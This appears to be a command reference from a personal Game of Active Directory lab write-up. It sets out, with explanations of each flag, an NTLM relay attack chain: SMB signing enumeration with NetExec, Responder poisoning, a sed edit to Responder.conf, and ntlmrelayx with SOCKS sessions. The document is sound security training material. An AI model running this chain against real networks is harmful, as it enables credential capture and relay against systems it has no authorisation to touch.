# 07 — Command Reference

## 1. Set the Evidence Directory

```bash
cd ~/goad-evidence/part-04
```

Changes the current directory to the private evidence folder for Part 4. Raw logs and sensitive authentication material should remain outside the Git repository.

## 2. Enumerate SMB Signing

```bash
nxc smb 192.168.56.10-23 --gen-relay-list relay-targets.txt
```

- `nxc` — launches NetExec.
- `smb` — selects SMB enumeration.
- `192.168.56.10-23` — specifies the target address range.
- `--gen-relay-list relay-targets.txt` — generates a list of hosts identified as suitable relay targets.

Review the resulting target list:

```bash
cat relay-targets.txt
nl -ba relay-targets.txt
```

- `cat` displays the file contents.
- `nl -ba` numbers every line, including blank lines, to make review easier.

## 3. Save the SMB Signing Baseline

```bash
echo "===== SMB SIGNING BASELINE =====" | tee smb-signing-baseline.txt
nxc smb 192.168.56.10-23 | tee -a smb-signing-baseline.txt
```

- `echo` prints the baseline heading.
- `|` pipes command output to the next command.
- `tee` displays output and writes it to a file.
- `tee -a` appends output instead of replacing the existing file.

## 4. Check Network Interfaces and Routes

```bash
ip -br addr
ip route
```

- `ip -br addr` displays network interfaces and addresses in brief format.
- `ip route` displays the system routing table.

These checks confirmed that `eth1` was the interface connected to the GOAD network.

## 5. Start Responder

```bash
sudo responder -I eth1 -v
```

- `sudo` runs the tool with elevated privileges.
- `responder` starts the poisoning framework.
- `-I eth1` selects the GOAD-facing interface.
- `-v` enables verbose output.

## 6. Disable Responder SMB and HTTP Listeners

The Responder configuration file used was `/etc/responder/Responder.conf`.

The following command changed the SMB and HTTP listener settings from `On` to `Off`:

```bash
sudo sed -i 's/SMB[[:space:]]*=[[:space:]]*On/SMB      = Off/; s/HTTP[[:space:]]*=[[:space:]]*On/HTTP     = Off/' /etc/responder/Responder.conf
```

- `sed` performs text substitutions.
- `-i` edits the configuration file in place.
- The first substitution changes the SMB setting.
- The second substitution changes the HTTP setting.

This allowed `ntlmrelayx` to own the corresponding listeners while Responder continued poisoning name-resolution requests. Verify the settings before restarting Responder.

## 7. Start ntlmrelayx

```bash
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf relay-targets.txt \
  -smb2support \
  -socks
```

- `sudo` runs the listener with elevated privileges.
- `python3` executes the packaged Python script.
- `-tf relay-targets.txt` specifies the relay target file.
- `-smb2support` enables SMB2 support.
- `-socks` enables SOCKS session support.

The backslash at the end of each continued command line tells the shell that the command continues on the next line.

## 8. Stop a Foreground Tool

Press `Ctrl+C` in the terminal running the foreground process when you need to stop it.

## Evidence and Safety Notes

- Keep raw logs and authentication material in `~/goad-evidence/part-04`.
- Do not commit NTLM challenge-response material, hashes, passwords, or raw logs containing secrets.
- Run lab commands only against systems within the authorized GOAD environment.
- Record observed results separately from conclusions that have not been verified.
